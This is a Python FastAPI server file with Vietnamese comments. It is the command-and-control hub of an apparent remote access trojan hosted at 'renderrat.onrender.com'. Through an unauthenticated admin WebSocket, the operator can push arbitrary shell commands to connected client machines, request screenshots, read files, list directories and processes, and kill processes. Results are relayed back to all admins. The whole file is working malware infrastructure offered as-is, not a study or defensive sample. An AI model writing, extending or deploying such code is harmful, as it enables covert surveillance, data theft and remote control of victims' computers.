from fastapi import FastAPI, WebSocket, WebSocketDisconnect, Request
from fastapi.responses import HTMLResponse
from fastapi.staticfiles import StaticFiles
from fastapi.templating import Jinja2Templates
from typing import Dict, Set
import json
import os

app = FastAPI()

# ===============================
# CONFIG TEMPLATE + STATIC
# ===============================

templates = Jinja2Templates(directory="templates")

# Chỉ mount static nếu thư mục tồn tại
if os.path.exists("static"):
    app.mount("/static", StaticFiles(directory="static"), name="static")

# ===============================
# STORAGE CONNECTIONS
# ===============================

clients: Dict[str, WebSocket] = {}
admins: Set[WebSocket] = set()

# ===============================
# WEB ADMIN PAGE
# ===============================

@app.get("/", response_class=HTMLResponse)
async def admin_page(request: Request):
    return templates.TemplateResponse("admin.html", {
        "request": request
    })

# Health check endpoint cho Render
@app.get("/health")
async def health_check():
    return {
        "status": "healthy",
        "clients_online": len(clients),
        "admins_online": len(admins)
    }

# ===============================
# CLIENT WEBSOCKET
# ===============================

@app.websocket("/ws/client/{client_id}")
async def client_ws(websocket: WebSocket, client_id: str):
    await websocket.accept()
    clients[client_id] = websocket
    
    print(f"[CLIENT CONNECTED] {client_id}")
    await notify_admins_clients()

    try:
        while True:
            data = await websocket.receive_text()
            message = json.loads(data)

            # Client gửi screenshot
            if message.get("type") == "screenshot":
                await broadcast_to_admins({
                    "type": "screenshot",
                    "client_id": client_id,
                    "image": message.get("image")
                })
                print(f"[SCREENSHOT] Received from {client_id}")
            
            # Client gửi kết quả command
            elif message.get("type") == "command_result":
                await broadcast_to_admins({
                    "type": "command_result",
                    "client_id": client_id,
                    "output": message.get("output")
                })
                print(f"[COMMAND RESULT] Received from {client_id}")
            
            # Client gửi system info
            elif message.get("type") == "client_connected":
                await broadcast_to_admins({
                    "type": "client_info",
                    "client_id": client_id,
                    "sysinfo": message.get("sysinfo")
                })
                print(f"[SYSINFO] Received from {client_id}")
            
            # Client gửi các loại data khác
            else:
                await broadcast_to_admins({
                    "type": message.get("type"),
                    "client_id": client_id,
                    "data": message.get("data")
                })

    except WebSocketDisconnect:
        if client_id in clients:
            del clients[client_id]
        print(f"[CLIENT DISCONNECTED] {client_id}")
        await notify_admins_clients()
    except Exception as e:
        print(f"[CLIENT ERROR] {client_id}: {e}")
        if client_id in clients:
            del clients[client_id]
        await notify_admins_clients()

# ===============================
# ADMIN WEBSOCKET
# ===============================

@app.websocket("/ws/admin")
async def admin_ws(websocket: WebSocket):
    await websocket.accept()
    admins.add(websocket)
    
    print(f"[ADMIN CONNECTED] Total admins: {len(admins)}")
    await notify_admins_clients()

    try:
        while True:
            data = await websocket.receive_text()
            message = json.loads(data)

            # Admin yêu cầu screenshot
            if message.get("type") == "request_screenshot":
                client_id = message.get("client_id")

                if client_id in clients:
                    await clients[client_id].send_text(json.dumps({
                        "type": "request_screenshot",
                        "quality": message.get("quality", 85)
                    }))
                    print(f"[REQUEST] Screenshot from {client_id}")

            # Admin gửi lệnh
            elif message.get("type") == "command":
                client_id = message.get("client_id")
                command = message.get("command")

                if client_id in clients:
                    await clients[client_id].send_text(json.dumps({
                        "type": "command",
                        "command": command
                    }))
                    print(f"[COMMAND] Sent to {client_id}: {command}")
            
            # Admin yêu cầu system info
            elif message.get("type") == "request_sysinfo":
                client_id = message.get("client_id")
                
                if client_id in clients:
                    await clients[client_id].send_text(json.dumps({
                        "type": "request_sysinfo"
                    }))
                    print(f"[REQUEST] System info from {client_id}")
            
            # Admin yêu cầu process list
            elif message.get("type") == "request_processes":
                client_id = message.get("client_id")
                
                if client_id in clients:
                    await clients[client_id].send_text(json.dumps({
                        "type": "request_processes"
                    }))
                    print(f"[REQUEST] Process list from {client_id}")
            
            # Admin kill process
            elif message.get("type") == "kill_process":
                client_id = message.get("client_id")
                pid = message.get("pid")
                
                if client_id in clients:
                    await clients[client_id].send_text(json.dumps({
                        "type": "kill_process",
                        "pid": pid
                    }))
                    print(f"[REQUEST] Kill process {pid} on {client_id}")
            
            # Admin list directory
            elif message.get("type") == "list_directory":
                client_id = message.get("client_id")
                path = message.get("path", ".")
                
                if client_id in clients:
                    await clients[client_id].send_text(json.dumps({
                        "type": "list_directory",
                        "path": path
                    }))
                    print(f"[REQUEST] List directory {path} on {client_id}")
            
            # Admin read file
            elif message.get("type") == "read_file":
                client_id = message.get("client_id")
                path = message.get("path")
                
                if client_id in clients:
                    await clients[client_id].send_text(json.dumps({
                        "type": "read_file",
                        "path": path
                    }))
                    print(f"[REQUEST] Read file {path} on {client_id}")

    except WebSocketDisconnect:
        admins.remove(websocket)
        print(f"[ADMIN DISCONNECTED] Total admins: {len(admins)}")
    except Exception as e:
        print(f"[ADMIN ERROR] {e}")
        if websocket in admins:
            admins.remove(websocket)

# ===============================
# HELPER FUNCTIONS
# ===============================

async def notify_admins_clients():
    """Thông báo danh sách client cho tất cả admin"""
    await broadcast_to_admins({
        "type": "clients",
        "clients": list(clients.keys())
    })

async def broadcast_to_admins(message: dict):
    """Gửi message đến tất cả admin"""
    dead_admins = set()

    for admin in admins:
        try:
            await admin.send_text(json.dumps(message))
        except Exception as e:
            print(f"[BROADCAST ERROR] {e}")
            dead_admins.add(admin)

    for dead in dead_admins:
        admins.remove(dead)

# ===============================
# STARTUP EVENT
# ===============================

@app.on_event("startup")
async def startup_event():
    print("=" * 50)
    print("🚀 Server Started!")
    print("=" * 50)
    print("Admin Panel: https://renderrat.onrender.com")
    print("WebSocket Client: wss://renderrat.onrender.com/ws/client/{client_id}")
    print("WebSocket Admin: wss://renderrat.onrender.com/ws/admin")
    print("=" * 50)
